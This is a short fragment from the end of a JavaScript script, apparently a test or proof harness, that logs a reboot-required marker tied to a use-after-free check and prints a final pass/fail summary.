            mark("REBOOT-REQUIRED", "reason=uaf-file-not-reclaimed");
        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
    }
})();
